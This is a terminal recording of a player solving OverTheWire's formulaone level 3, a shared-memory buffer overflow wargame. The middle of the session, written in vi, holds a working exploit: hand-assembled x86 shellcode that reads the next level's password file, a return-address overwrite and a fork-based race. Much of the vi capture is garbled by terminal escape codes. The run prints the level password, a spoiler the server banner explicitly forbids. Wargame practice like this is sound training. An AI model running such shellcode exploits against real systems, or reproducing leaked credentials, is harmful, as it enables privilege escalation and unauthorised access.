@@ -1,0 +1,206 @@
+bash-5.2$ export PS1='client$ '
+client$ ssh -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=15 -o ServerAliveCountMax=4 -o HostKeyAlgorithms=+ssh-rsa,ssh-dss -o KexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1 formulaone3@drifter.labs.overthewire.org -p 2232
+             __                            _                        
+            / _| ___  _ __ _ __ ___  _   _| | __ _  ___  _ __   ___ 
+           | |_ / _ \| '__| '_ ` _ \| | | | |/ _` |/ _ \| '_ \ / _ \
+           |  _| (_) | |  | | | | | | |_| | | (_| | (_) | | | |  __/
+           |_|  \___/|_|  |_| |_| |_|\__,_|_|\__,_|\___/|_| |_|\___|
+                                                                    
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-0
+formulaone3@drifter.labs.overthewire.org's password: 
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+formulaone3@formulaone:~$ id
+uid=20003(formulaone3) gid=20003(formulaone3) groups=20003(formulaone3)
+formulaone3@formulaone:~$ cat /formulaone/formulaone3.c
+/*'09 codegate chal
+PROVE YOUR MIGHT
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/shm.h>
+#include <time.h>
+
+unsigned int keys[] = {0xADCADC00, 0xADC00ADC, 0x00ADCADC, 0x0ADCADC0};
+unsigned int SHMKEY;
+
+struct msg {
+  int sz;
+  char ptr[1024];
+} msg;
+
+struct msg *echo;
+
+void doecho(){
+  int shmid;
+  char buf[256];
+  shmid = shmget(SHMKEY, 8192, IPC_CREAT | 0777);
+  echo = shmat(shmid, NULL, SHM_EXEC);
+
+  if( echo->sz ) {
+    if( echo->sz < sizeof(buf)) {
+      printf("The msg is...\n");
+      memcpy(buf, echo->ptr, echo->sz);
+      printf("%s\n",buf);
+    }
+  }
+
+}
+
+int main(int argc, char *argv[]){
+  if(!argv[1])return 0;
+  SHMKEY= keys[argv[1][0]&3];
+  doecho();
+}
+formulaone3@formulaone:~$ mkdir -p /run/screen/f3 && cd /run/screen/f3
+formulaone3@formulaone:/run/screen/f3$ vi /run/screen/f3/f1l3.c
+[>4;2m="/run/screen/f3/f1l3.c" 66L, 2988B▽  Pzz\[0%m           [>c#include <stdio.h>
+#include <stdlib.h>#include <string.h>#include <unistd.h>
+#include <sys/ipc.h>
+#include <sys/shm.h>
+#include <sys/wait.h>
+#include <signal.h>
+struct msg { int sz; char ptr[1024]; };
+int main(int argc, char **argv) {
+    unsigned int shmkey = strtoul(argv[1], 0, 0);
+    unsigned int shmaddr = strtoul(argv[2], 0, 0);
+    int sc_off = 0x200;
+    int shmid = shmget(shmkey, 8192, IPC_CREAT | 0777);
+    if (shmid < 0) { perror("shmget"); return 1; }
+    struct msg *m = shmat(shmid, NULL, 0);
+    if (m == (void*)-1) { perror("shmat"); return 1; }
+    memset(m->ptr, 'A', 1024);
+    *(unsigned int *)(m->ptr + 0x110) = shmaddr + sc_off;
+    {   /* shellcode: open/read/write /etc/formulaone_pass/formulaone3 -> fd 1 */char *path = "/etc/formulaone_pass/formulaone3";int len = strlen(path), off = 0;m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xC0;m->ptr[sc_off + off++] = 0x50;for (int c = len - 4; c >= 0; c -= 4) {m->ptr[sc_off + off++] = 0x68;for (int k = 0; k < 4; k++)m->ptr[sc_off + off++] =(c + k < len) ? path[c + k] : 0;}m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xE3;m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xC9;m->ptr[sc_off + off++] = 0xB0; m->ptr[sc_off + off++] = 0x05;1,1Top^[  ^[  :set noai nocin nosi indentexpr= formatoptions=1,1TopdG  ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   --No lines in buffer--0,0-1Alli -- INSERT --0,1All#1,2inclu7#include <s12tdio.h8<stdio.h>2,1 #in4c5l6u7d8e910#include <1s2t3d4lib.h9<stdlib.h>3,1 #2inclu7de10#include <s2tring.h9<string.h>204,1 #2incl6#include <11unistd7<unistd.h>5,1 #i3n4c5l6u7d8e910#include <1s2y3s4/5i6p7c8.9h20<sys/ipc.h>16,1 #2i3n4c5l6u7d8e910#include <1s2y3s/5s6h7m8.9h20<sys/shm.h>17,1 #2i3n4c5l6u7d8e910#include <1s2y3s4/5w6a7i8t9.20h1<sys/wait.h>28,1 #2i3n4c5l6u7d8e910#include <1s2i3g4n5a6l7.8h9<signal.h>209,1 s2t3r4u5c6struct78m9s10g12{34i5n6int78s9z20;12c3h4a5char67p8t9r30[112032445][]6;[]78}{}9;{}4010,1i2n3int45m6a7i8n9(10i1int34a5r6g7c8,920c1h2a3char45*6*7a8r9g30v1)()2()3{41,1 2345u6n7s8i9g10n1e2    unsigned34i5n6int78s9h20m1k2e3y45=67s8t9r30t1o2u3l4(5a6r7g8v9[4011][]2,[]3405,6708)()9;()502,1 2345u6n7s8i9g10n1e2    unsigned34i5n6int78s9hmad23d4r56=78s9trtou34l5(6a7r8g9v40[12],4 06,7809)()50;()13,1 2345int89s10c1_2o3f4f56=7 0x200x210203;44,1 2345in7int9s10h1m2i3d45= shmg21e2t3(4s5h6mkey, 81923,78I9P40C1_2C3R4E5A6T78|950017277)()5;()5,1 2345if7 (shmi13d45<6708)()9()20{12p3e4r5r6o7r8("shmg34e5t6"7)()8;()9 r41etu4r5return6718;950}6,1 2345s6t7r8u9c10struct msg56*7m89=201shmat6(7s8h9m30i1d2,4NU6L7NULL8,94001)()2;()7,1 235i6if78(9m101== (5v6o7i8void9*20)()1-()21) {7perror("35s6h7m8a9t40"1)()2;()34r5e6t7u8r9return5011; }{}5{}8,1 5m6e7m8s9e10t1(2m3-4>5p6t7r8,920'1A2'A', 16072849)()30;()19,1 35*6(7u8n9s10i1g2n3e4unsigned56i7n8int920*1)(m->6p7t8r930+120x11607)()8()9=401s2hmaddr89+501s2c_off;20,1 45{69/10/*1 2s3h4e5llco9de21:2 3o4p5e6n7/8r9e30a1d2/3w4r5i6t7e8 9/40e1t2c/for7m8u9l50a1o2ne_pas8s9/60f1o2r3mula7o8n9e7031 2-3>4 5fd7 1 *81/1,1 379ch11char4*p6ath20= "/4etc/f9orm32u3l4a5o6n7e8_9p40a1s2s3/4f5o6r7m8u9l50a1o2n3e435"6;72,1 2345679i10n1int23l4e5n67=89s20t1r2l3e4n5(6p7a8t9h30)(path)1,(path)23o4f5f67=89040;13,1 23456789m10-1>2p3t4r5[6s7c8_9o20f1f23+45o6f7f8+9+30][]1[]2=3405x318;940m1-2>3p4t5r6[7s8c9_50o1f2f34+56o7f8f9+60+1][]2[]3=45060x70xC809;704,1 23456789m10-1>2p3t4r5[6s7c8_9o20f1f23+45o6f7f8+9+30][]1[]2=34050x60x5708;95,1 23456789f10o1for23(4i5n6int78c920=12l3e4n56-7849;301c23>4=5607;89c401-2=3445)()6 {()86,1 67891013m4-5>6p7t8r9[20s1c2_off + of31f+3+4][]5[]6=78090x400x6182;37,1 2345612 f4o5for67(8i9n20int12k34=5607;89k301< 4;56k7+8+9)()40()8,1 2345678910123456 m8-9>20p1t2r[sc_o8f9f301+23of5f6++8][]9[]40=1
+~                                                                                                   29,1Bot2567891123456721(2c34+ k <30l1e2n3)()4()5? path[c + k47][c + k]8[c + k]9:50102;3
+~                                                                                                   30,1Bot23456789}{}10
+~                                                                                                   31,1Bot{}
+23456789m10-1>2p3t4r5[sc_of21f23+45o6f7f8+9+30][]1 = 0x89; m[]4-2>3p4t5r6[7s8c9_50o1f2f34+56off++][]62[]3=4 060x70xE839;70
+~                                                                                                   32,1Bot23456789m10-1>2p3t4r[s7c8_9o20f1f +4 of7f8+9+30][]1[]2= 0x3718;940m1-2>3pt5r[sc9_off534+56o7f8f9+60+1][]2[]3=45060x70xC899;70
+~                                                                                                   33,1Bot2345678 m->pt14r5[6s7c8_9o20f1f23+45o6f7f8+9+30][]1[]2= 0xB708;940m1-2>ptr[s8c9_50o1f2f3 +6of8f9+60+][]2[]3=50x059
+;~                                                                                                   34,1Bot234569m10-1>2p3t4r[sc_9o20f1f23+45o6ff++] = 0xCD;3940m1-2>3p4t5r6[7s8c9_50o1f2f34+ off9+60+1][]2[]3=4506
+x80;~                                                                                                   35,1Bot23456789m->p13t4r5[6s7c8_9off23+5o6f7f8+9+30] = 0x89; m41->3p4t5r6[7s8c9_50o1f2f34+56o7ff9++]63=45060x70xC839
+;~                                                                                                   36,1Bot9m10-1>2p3t4r[s7c8_9off +25o6f7f8+9+30]2=4050x60x8738;940m1->ptr6[7s8c9_50o1f2f3 + off++] =645060x70xE8C9;70
+~                                                                                                   37,1Bot2345679m10-1>2p3t4r[sc_off + of27f8+9+30][]1[]2=34050x60x4708;9
+~                                                                                                   38,1Bot23789m10-1>2ptr[sc8_off +25o6f7f8+9+30][]1[]2=34050x60x8798;940m1-2>3p4t5r[s8c9_50o1f2f34+ off9+60+1][]2[]3=4506xE1;70
+~                                                                                                   39,1Bot23456789m10-1>2p3t4r5[sc8_o20f1f23+45of7f8++][]31[]2=34050x60x3718;9 m->ptr[sc_o51f2f34+56o7f8f9+60+1][]2[]3=45060x7
+0xD2;~                                                                                                   40,1Bot23456789m10-1>2p3t4r5[6s7c8_9off23+45o6f7f8++]32=34050x60xB728;9 m-42>p4t5r6[7s8c9_off +56off+60+1][]2[]3=45060x70x2819;70
+~                                                                                                   41,1Bot2349m10-1>pt4r[s7c8_9o20f1f23+45o6f7f8+9+30][]1[]2=34050x60xB708;940m1-2>3p4t5r6[7s8c9_50o1f2f34+56o7f8f9+60+1][]2[]3=45060x70x0839;70
+~                                                                                                   42,1Bot23456789m10-1>2p3t4r5[6s7c8_9o20f1f23+45o6f7f8+9+30][]1[]2=34050x60xC7D8;940m1-2>3p4t5r6[7s8c9_50o1f2f34+56o7f8f9+60+1][]2 = 0[]60x70x8809;70
+~                                                                                                   43,1Bot23456789m10-1>2p3t4r5[6s7c8_9o20f1f23+45off+9+30][]1[]2=34050x60x3718;940m1-2>3p4t5r6[7s8c9_50o1f2f34+56o7f8f9+60+1][]2[]3=45060x70xD8B9;70
+~                                                                                                   44,1Bot23456789m10-1>2p3t4r5[6s7c8_9o20f1f23+45o6f7f8+9+30][]1[]2=34050x60xB738;940m1-2>3p4t5r6[7s8c9_50o1f2f34+56o7f8f9+60+1][]2[]3=45060x70x0819;70
+~                                                                                                   45,1Bot23456789m10-1>2p3t4r5[6s7c8_9o20f1f23+45o6f7f8+9+30][]1[]2=34050x60x8798;940m1-2>3p4t5r6[7s8c9_50o1f2f34+56o7f8f9+60+1][]2[]3=450xE819;70
+~                                                                                                   46,1Bot23456789m10-1>2p3t4r5[6s7c8_9o20f1f23+45o6f7f8+9+30][]1[]2=34050x60x879;940m1-2>3p4t5r6[7s8c9_50o1f2f34+56o7f8f9+60+1][]2[]3=45060x70xC829;70
+~                                                                                                   47,1Bot23456789m10-1>2p3t4r5[6s7c8_9o20f1f23+45o6f7f8+9+30][]1[]2=34050x60xB708;940m1-2>3p4t5r6[7s8c9_50o1f2f34+56o7f8f9+60+1][]2[]3=45060x70x0849;70
+~                                                                                                   48,1Bot23456789m10-1>2p3t4r5[6s7c_o20f1f23+45o6f7f8+9+30][]1[]2=34050x60xC7D8;940m1-2>3p4t5r6[7s8c9_50o1f2f34+56o7f8f9+60+1][]2[]3=45060x70x8809;70
+~                                                                                                   49,1Bot23456789m10-1>2p3t4r5[6s7c8_9o20f1f23+45o6f7f8+9+30][]1[]2=34050x60x3718;940m1-2>3p4t5r6[7s8c9_50o1f2f34+56o7f8f9+60+1][]2[]3=45060x70xD8B9;70
+~                                                                                                   50,1Bot23456789m10-1>2p3t4r5[6s7c8_9o20f1f23+45o6f7f8+9+30][]1[]2=34050x60xB708;940m1-2>p4t5r6[7s8c9_50o1f2f34+56o7f8f9+60+1][]2[]3=45060x70x0819;70
+~                                                                                                   51,1Bot23456789m10-1>2p3t4r5[6s7c8_9off223+45o6f7f8+9+30][]1[]2=34050x60xC7D8;940m1-2>3p4t5r6[7s8c9_50o1f2f34+56o7f8f9+60+1]3=45060x70x8809;70
+~                                                                                                   52,1Bot2345}63,12345p6i7d8_9t101t23=45f6o7for8fork9(20)()1;()24,1 2345i6if78(9t101=2=3405)()6()7{89w20h1i2l3while45(617)()8()9{301m2-3>4s5z67=8914001;23m4-5>6s7z89=501020x30x440506;78}{}9{}60}{}1{}5,1 2345f6o7for89(10i1n2int34r5o6u7n8d920=1203;45r6o7u8n9d301<23440506;78r9o40u1n2d3+4+5)()6()7{86,1 23456789p10i1d2_3t45p67=89f20o1for2fork3(4)()5;()67,1 23456789i10if12(3p45==7809)()20()1{2
+58,1Bot2345671123e4x5e6c7l8(9"20/1f2o3r4m5u6l7a8o9n30e1/2f3o4r5m6u7l8a9o40n1e233"4,56"7f8o9r50m1u2l3a4o5n6e738"9,601"2a3"4,56(7c8h9a70char1*2)()30()4)()5;()6
+59,1Bot2345678910123_4e5xi7t8(91202172)()3;()4
+60,1Bot23456789}{}10
+61,1Bot{}
+23456789w10a1i2t3p4i5d6(7p8,920N1U2L3NULL4,5607)()8;()9
+62,1Bot2345}{}6
+63,1Bot{}
+2345k6i7l8l(10t1,23S4I5G6K7I8L9SIGKILL20)()1;()2
+64,1Bot2345r6e7t8u9r10return1203;4
+65,1Bot}2
+66,1Bot^[  66,0-1Bot:wq[>4;m"f1l3.c" 66L, 2988B written
+>[>4;mformulaone3@formulaone:/run/screen/f3$ gcc /run/screen/f3/f1l3.c -o /run/screen/f3/f1l3
+formulaone3@formulaone:/run/screen/f3$ timeout 100 /run/screen/f3/f1l3 0xADC00ADC 0xf7fb9000 2>/dev/null | grep -aE '^[A-Za-z0-9]{20,}' | head -1
+O50RB7ijle1PYuGyw595NuU9O8S49b4o
+formulaone3@formulaone:/run/screen/f3$ cat /etc/formulaone_pass/formulaone3
+O50RB7ijle1PYuGyw595NuU9O8S49b4o
+formulaone3@formulaone:/run/screen/f3$ exit
+logout
+Connection to drifter.labs.overthewire.org closed.
+client$ exit
+exit
